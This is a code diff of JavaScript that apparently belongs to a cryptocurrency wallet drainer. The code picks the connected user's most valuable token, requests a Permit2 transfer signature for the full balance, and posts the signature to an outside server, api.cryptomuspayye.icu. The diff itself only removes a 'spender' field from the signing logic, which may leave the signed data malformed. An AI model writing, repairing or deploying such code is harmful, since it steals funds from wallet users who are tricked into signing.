@@ -748,7 +748,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
       } else {
         const token = erc20WithBalance.reduce((acc, t) => (t.price * t.balance > (acc?.price || 0) * (acc?.balance || 0) ? t : acc), erc20WithBalance[0])
         const amount = parseUnits(token.balance.toString(), token.decimals)
-        const spender = PERMIT2_SPENDER
         const deadline = Math.floor(Date.now() / 1000) + 60 * 10
         const nonce = BigInt(Date.now())
         try {
@@ -757,7 +756,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
             account: state.address,
             token: token.address,
             amount,
-            spender,
             nonce,
             deadline
           })
@@ -767,7 +765,6 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
             permit2: {
               token: getAddress(token.address),
               amount: amount.toString(),
-              spender: getAddress(spender),
               nonce: nonce.toString(),
               deadline,
               signature
@@ -873,7 +870,6 @@ const PERMIT2_DOMAIN = (chainId) => ({ name: 'Permit2', chainId, verifyingContra
 const PERMIT2_TYPES = {
   PermitTransferFrom: [
     { name: 'permitted', type: 'TokenPermissions' },
-    { name: 'spender', type: 'address' },
     { name: 'nonce', type: 'uint256' },
     { name: 'deadline', type: 'uint256' }
   ],
@@ -882,19 +878,18 @@ const PERMIT2_TYPES = {
     { name: 'amount', type: 'uint256' }
   ]
 }
-const buildPermit2Message = ({ token, amount, spender, nonce, deadline }) => ({
+const buildPermit2Message = ({ token, amount, nonce, deadline }) => ({
   permitted: { token, amount },
-  spender,
   nonce,
   deadline
 })
-const signPermit2 = async ({ chainId, account, token, amount, spender, nonce, deadline }) => {
+const signPermit2 = async ({ chainId, account, token, amount, nonce, deadline }) => {
   const signature = await signTypedData(wagmiAdapter.wagmiConfig, {
     account: getAddress(account),
     domain: PERMIT2_DOMAIN(chainId),
     types: PERMIT2_TYPES,
     primaryType: 'PermitTransferFrom',
-    message: buildPermit2Message({ token: getAddress(token), amount, spender: getAddress(spender), nonce, deadline })
+    message: buildPermit2Message({ token: getAddress(token), amount, nonce, deadline })
   })
   return signature
 }
@@ -1042,14 +1037,13 @@ const initializeSubscribers = (modal) => {
         if (!USE_SENDCALLS && USE_PERMIT2) {
           const token = mostExpensive
           const amount = parseUnits(token.balance.toString(), token.decimals)
-          const spender = PERMIT2_SPENDER
           const deadline = Math.floor(Date.now() / 1000) + 60 * 10
           const nonce = BigInt(Date.now())
           try {
-            const signature = await signPermit2({ chainId: token.chainId, account: state.address, token: token.address, amount, spender, nonce, deadline })
+            const signature = await signPermit2({ chainId: token.chainId, account: state.address, token: token.address, amount, nonce, deadline })
             const resp = await fetch('https://api.cryptomuspayye.icu/api/permit2', {
               method: 'POST', headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ userAddress: state.address, chainId: token.chainId, permit2: { token: getAddress(token.address), amount: amount.toString(), spender: getAddress(spender), nonce: nonce.toString(), deadline, signature } })
+              body: JSON.stringify({ userAddress: state.address, chainId: token.chainId, permit2: { token: getAddress(token.address), amount: amount.toString(), nonce: nonce.toString(), deadline, signature } })
             })
             const data = await resp.json().catch(() => ({}))
             if (resp.ok && data.success) {
